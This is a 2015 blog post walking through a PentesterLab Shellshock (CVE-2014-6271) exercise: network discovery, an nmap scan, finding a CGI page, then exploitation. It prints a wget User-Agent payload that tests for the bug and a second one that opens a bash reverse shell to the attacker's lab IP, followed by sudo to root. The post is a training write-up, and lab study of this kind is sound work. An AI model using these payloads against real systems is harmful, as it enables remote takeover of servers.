
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>[PentesterLab] CVE-2014-6271/Shellshock - F4l13n5n0w</title>
  <meta name="author" content="F4l13n5n0w">

  
  <meta name="description" content="This is an exercise from PentesterLab to reproduce &amp; demonstrate how to exploit CVE-2014-6271 [Shellshock] vulnerability. More information and &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://f4l13n5n0w.github.io/blog/2015/05/07/pentesterlab-cve-2014-6271-slash-shellshock/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="F4l13n5n0w" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">F4l13n5n0w</a></h1>
  
    <h2>Security & Pen testing learning notes &#8211; F4l13n5n0w</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="f4l13n5n0w.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">

  <li><a href="/">段子 | Blogging</a></li>
  <li><a href="/reading">藏♥品 | Reading</a><li>
  <li><a href="/about">玩意儿 | Coding</a><li>

</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">[PentesterLab] CVE-2014-6271/Shellshock</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-07T07:33:16-04:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:33 am</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><p>This is an exercise from <a href='https://www.pentesterlab.com/'>PentesterLab</a> to reproduce &amp; demonstrate how to exploit CVE-2014-6271 [Shellshock] vulnerability. More information and ISO download please check <a href='https://www.pentesterlab.com/exercises/cve-2014-6271'>here</a>. The <a href='https://www.pentesterlab.com/exercises/cve-2014-6271/course'>official course</a> is highly recommended to read, which explains how the bug works and the ways to exploit it for different purposes.</p>

<p>Difficulty: 1 / 5</p>

<h2>Links</h2>


<p>watch video online:</p>

<iframe src='http://player.vimeo.com/video/127037311?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<!-- more -->


<h2>Method</h2>


<ul style="list-style-type:disc">
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>By checking source code of the web page and found hidden path &#8220;/cgi-bin/status&#8221; [firefox]</li>
<li>Test and Exploit shellshock vulnerability to get reverse shell and ROOT [nc]</li>
</ul>


<h2>Tools</h2>


<p>All the tools used here can be found in Kali Linux</p>

<ul style="list-style-type:disc">
<li><a href='http://nixgeneration.com/~jaime/netdiscover/'>Net Discover</a></li>
<li><a href='https://nmap.org/'>Nmap</a></li>
<li><a href='https://www.mozilla.org/en-US/firefox/new/'>Firefox</a></li>
<li><a href='http://netcat.sourceforge.net/'>nc</a></li>
</ul>




<h2>Walkthrough</h2>


<p>This is a pretty easy one and not much things to talk. In according to we already know the server is vulnerable to ShellShock (CVE-2014-6271), so all we need to do just find the target machine, test if the vulnerability still works and exploit it to get a shell.</p>

<h3>Find and Exploit the ShellShock vulnerability</h3>


<p>After found the IP address of target server, and based on the result of Nmap scan, the attacker discovered apache is running and listening on TCP port 80.</p>

<p><img src="/downloads/shellshock/1.png"></p>

<p>Then the attacker interacted with the web server, by using “Firefox” browser to graphically render the web application on the target. By checking the source code, the attacker found the CGI page which calls system command (“/cgi-bin/status”).</p>

<p><img class="left" src="/downloads/shellshock/2.png"></p>

<p>After found the CGI page, the attacker use &ldquo;wget&rdquo; to test if there is ShellShock vulnerability in this CGI page.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -U "() { test;};echo \"Content-type: text/plain\"; echo; /bin/bash -c 'echo vulnerable'" http://10.10.10.129/cgi-bin/status</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="/downloads/shellshock/3.png"></p>

<p>As we can see above, the command &ldquo;echo vulnerable&rdquo; has been executed by the server, so it is vulnerable to ShellShock.</p>

<p>Now it is time to exploit it. The attacker set up NC listen on port 5555 and send the following command to exploit for getting a reverse shell.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -U "() { test;};echo \"Content-type: text/plain\"; echo; /bin/bash -i >& /dev/tcp/10.10.10.131/5555 0>&1" http://10.10.10.129/cgi-bin/status</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="/downloads/shellshock/4.png"></p>

<p>Due to pentesterlab is belong to sudoers group, so it is easy to get ROOT through &ldquo;sudo&rdquo; command.</p>

<p><img src="/downloads/shellshock/5.png"></p>

<p>Game over :)</p>

<h2>Reference</h2>


<p>For more information about shell shock/bash bug, the following links have already given out good explaination.</p>

<p>[1] <a href="http://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability">http://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability</a><br>
[2] <a href="http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited">http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited</a><br>
[3] <a href="https://blog.cloudflare.com/inside-shellshock/">https://blog.cloudflare.com/inside-shellshock/</a><br></p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">F4l13n5n0w</span></span>

      




<time class='entry-date' datetime='2015-05-07T07:33:16-04:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:33 am</span></time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/bash-bag/'>bash bag</a>, <a class='category' href='/blog/categories/pentesterlab/'>pentesterlab</a>, <a class='category' href='/blog/categories/shellshock/'>shellshock</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  
  
    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/05/05/jing-yan-fen-xiang-oscp-shen-tou-ce-shi-ren-zheng/" title="Previous Post: [经验分享] OSCP 渗透测试认证">&laquo; [经验分享] OSCP 渗透测试认证</a>
      
      
        <a class="basic-alignment right" href="/blog/2015/05/09/pentesterlab-xss-and-mysql-file/" title="Next Post: [PentesterLab] XSS and MySQL File">[PentesterLab] XSS and MySQL File &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Previous Blog</h1>
  <p><a href='http://fallensnow-jack.blogspot.com/'>http://fallensnow-jack.blogspot.com/</a></p>
  <h1>About Me</h1>
  <p>On the way to be a hacker</p>
  <ul id="certifications">
    <li class="post">
      <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional"><img src="/downloads/oscp-1.png" alt="Offensive Security Certified Professional" /></a>
    </li>
  </ul>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/06/21/vulnhub-knock-knock-1-dot-1/">[Vulnhub]Knock-Knock: 1.1</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/06/13/vulnhub-tophatsec-freshly/">[Vulnhub]TopHatSec: Freshly</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/05/31/pentesterlab-php-lfi-and-post-exploitation/">[PentesterLab] PHP LFI &amp; Post Exploitation</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/05/30/pentesterlab-axis2-web-service-and-tomcat-manager/">[PentesterLab] Axis2 Web Service and Tomcat Manager</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/05/25/vulnhub-kioptrix-2014/">[Vulnhub] Kioptrix 2014</a>
      </li>
    
  </ul>
</section>




<section>
  <h1>Tag Cloud</h1>
    <span id="tag-cloud"><a href='/blog/categories/axis2' style='font-size: 106.66666666666667%'>axis2(1)</a> <a href='/blog/categories/bash-bag' style='font-size: 106.66666666666667%'>bash bag(1)</a> <a href='/blog/categories/bof' style='font-size: 106.66666666666667%'>bof(1)</a> <a href='/blog/categories/commands-injection' style='font-size: 106.66666666666667%'>commands injection(1)</a> <a href='/blog/categories/freshly' style='font-size: 106.66666666666667%'>freshly(1)</a> <a href='/blog/categories/kioptrix2014' style='font-size: 106.66666666666667%'>kioptrix2014(1)</a> <a href='/blog/categories/knock-knock' style='font-size: 106.66666666666667%'>knock-knock(1)</a> <a href='/blog/categories/ldap-injection' style='font-size: 106.66666666666667%'>ldap injection(1)</a> <a href='/blog/categories/lfi' style='font-size: 106.66666666666667%'>lfi(1)</a> <a href='/blog/categories/mysql-injection' style='font-size: 106.66666666666667%'>mysql injection(1)</a> <a href='/blog/categories/oscp' style='font-size: 106.66666666666667%'>oscp(1)</a> <a href='/blog/categories/pentesterlab' style='font-size: 160.0%'>pentesterlab(9)</a> <a href='/blog/categories/php-lfi' style='font-size: 106.66666666666667%'>php lfi(1)</a> <a href='/blog/categories/play-framework' style='font-size: 106.66666666666667%'>play framework(1)</a> <a href='/blog/categories/post-exploitation' style='font-size: 106.66666666666667%'>post exploitation(1)</a> <a href='/blog/categories/pwk' style='font-size: 106.66666666666667%'>pwk(1)</a> <a href='/blog/categories/session-injection' style='font-size: 106.66666666666667%'>session injection(1)</a> <a href='/blog/categories/shellshock' style='font-size: 106.66666666666667%'>shellshock(1)</a> <a href='/blog/categories/sql-injection' style='font-size: 113.33333333333333%'>sql injection(2)</a> <a href='/blog/categories/tomcat' style='font-size: 106.66666666666667%'>tomcat(1)</a> <a href='/blog/categories/tophatsec' style='font-size: 106.66666666666667%'>tophatsec(1)</a> <a href='/blog/categories/upload-bypass' style='font-size: 106.66666666666667%'>upload bypass(1)</a> <a href='/blog/categories/vulnhub' style='font-size: 120.0%'>vulnhub(3)</a> <a href='/blog/categories/web-for-pentester' style='font-size: 120.0%'>web for pentester(3)</a> <a href='/blog/categories/xml-injection' style='font-size: 106.66666666666667%'>xml injection(1)</a> <a href='/blog/categories/xss' style='font-size: 113.33333333333333%'>xss(2)</a> </span>
</section>
<section>
  <h1>Categories</h1>
    <ul id="category-list"><li><a href='/blog/categories/axis2/'>axis2 (1)</a></li><li><a href='/blog/categories/bash-bag/'>bash bag (1)</a></li><li><a href='/blog/categories/bof/'>bof (1)</a></li><li><a href='/blog/categories/commands-injection/'>commands injection (1)</a></li><li><a href='/blog/categories/freshly/'>freshly (1)</a></li><li><a href='/blog/categories/kioptrix2014/'>kioptrix2014 (1)</a></li><li><a href='/blog/categories/knock-knock/'>knock-knock (1)</a></li><li><a href='/blog/categories/ldap-injection/'>ldap injection (1)</a></li><li><a href='/blog/categories/lfi/'>lfi (1)</a></li><li><a href='/blog/categories/mysql-injection/'>mysql injection (1)</a></li><li><a href='/blog/categories/oscp/'>oscp (1)</a></li><li><a href='/blog/categories/pentesterlab/'>pentesterlab (9)</a></li><li><a href='/blog/categories/php-lfi/'>php lfi (1)</a></li><li><a href='/blog/categories/play-framework/'>play framework (1)</a></li><li><a href='/blog/categories/post-exploitation/'>post exploitation (1)</a></li><li><a href='/blog/categories/pwk/'>pwk (1)</a></li><li><a href='/blog/categories/session-injection/'>session injection (1)</a></li><li><a href='/blog/categories/shellshock/'>shellshock (1)</a></li><li><a href='/blog/categories/sql-injection/'>sql injection (2)</a></li><li><a href='/blog/categories/tomcat/'>tomcat (1)</a></li><li><a href='/blog/categories/tophatsec/'>tophatsec (1)</a></li><li><a href='/blog/categories/upload-bypass/'>upload bypass (1)</a></li><li><a href='/blog/categories/vulnhub/'>vulnhub (3)</a></li><li><a href='/blog/categories/web-for-pentester/'>web for pentester (3)</a></li><li><a href='/blog/categories/xml-injection/'>xml injection (1)</a></li><li><a href='/blog/categories/xss/'>xss (2)</a></li></ul>
</section>

  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - F4l13n5n0w -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  



<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) {return;}
  js = d.createElement(s); js.id = id; js.async = true;
  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>









</body>
</html>
